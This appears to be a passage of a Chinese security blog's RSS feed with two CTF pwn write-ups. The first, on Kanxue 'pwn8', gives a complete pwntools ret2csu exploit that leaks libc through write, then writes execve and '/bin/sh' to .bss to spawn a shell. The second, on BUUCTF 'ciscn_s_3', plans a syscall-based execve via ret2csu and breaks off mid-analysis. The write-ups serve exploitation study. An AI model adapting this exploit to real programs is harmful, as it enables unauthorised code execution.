            <guid isPermalink="true">https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/</guid>
            <title>看雪社区pwn8（64位构造通用ROP，ret2csu）</title>
            <link>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/</link>
            <category>pwn</category>
            <category>ret2csu</category>
            <category>ctf</category>
            <pubDate>Thu, 04 May 2023 19:33:55 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看程序&#34;&gt;#&lt;/a&gt; 查看程序&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;64位程序开启了nx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位程序开启了nx&#34;&gt;#&lt;/a&gt; 64 位程序，开启了 NX&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;有溢出漏洞， &lt;strong&gt;变量为 char 型变量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;没有后门函数， 那就 &amp;lt;font color=red&amp;gt; 去 libc 中找 execve 地址执行 &amp;lt;/font&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;偏移量为 136&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;write：write(1，输出地址，输出字节数)      
             write(1,write_got,8)                
read：read(0,写入地址，写入字节数)
             read(0,bss_base,16)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./pwn8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;read&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bss&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000400606&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0004005F0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;csu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;csu2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;last&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#不能用 sendline，会出错&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write_really&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write_really&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;write_really&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;write&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;execve&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;execve&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;execve&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bss_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 &#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;参考链接 ret2csu：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==&#34;&gt;http://t.csdn.cn/DIqYv&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/</guid>
            <title>ciscn_s_3（利用系统调用+ret2csu）</title>
            <link>https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/</link>
            <category>pwn</category>
            <category>ret2csu</category>
            <category>ctf</category>
            <category>系统调用</category>
            <pubDate>Thu, 04 May 2023 19:33:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn_s_3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_s_3&#34;&gt;#&lt;/a&gt; ciscn_s_3&lt;/h1&gt;
&lt;h3 id=&#34;1下载附件后查看程序信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1下载附件后查看程序信息&#34;&gt;#&lt;/a&gt; 1. 下载附件后查看程序信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sKKK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到是 64 位程序，并且开启了 NX&lt;/p&gt;
&lt;h3 id=&#34;2利用ida反汇编&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2利用ida反汇编&#34;&gt;#&lt;/a&gt; 2. 利用 ida 反汇编&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6s85d.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现有个 vul 函数，进入查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sJPA.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现是 sys_read 函数，并且可以通过 &lt;strong&gt;sys_read 溢出&lt;/strong&gt;，查看汇编代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sY8I.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现有 syscall，由此判断是系统调用，那么我们通过 &lt;strong&gt;控制寄存器&lt;/strong&gt; 的方式来进行系统调用然后 getshell&lt;/p&gt;
&lt;h3 id=&#34;3漏洞利用分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3漏洞利用分析&#34;&gt;#&lt;/a&gt; 3. 漏洞利用分析&lt;/h3&gt;
&lt;p&gt;此处放上之前的文章：&lt;a href=&#34;https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/&#34; title=&#34;Linux之系统调用&#34;&gt;https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;
int execve(const char *filename, char *const argv[], char *const envp[]);

//const char *filename 为要执行文件的地址

//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名

//char *const envp[]：一般传递NULL，表示可变参数的结尾。

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们要执行的是  &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)&lt;/code&gt;  来 getshell&lt;/p&gt;
&lt;h3 id=&#34;4控制寄存器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4控制寄存器&#34;&gt;#&lt;/a&gt; 4. 控制寄存器&lt;/h3&gt;
&lt;p&gt;将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx&lt;/p&gt;
&lt;p&gt;本想着通过 Ropgadgets 查找对应寄存器构造 rop 链&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sHR1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法&lt;/p&gt;
&lt;p&gt;查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sxde.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)&lt;/p&gt;
&lt;p&gt;接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   &lt;strong&gt;csu_init（ret2csu）&lt;/strong&gt;  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 &lt;strong&gt;一定存在&lt;/strong&gt; 这个函数，并且该函数先于 main 函数执行&lt;/p&gt;
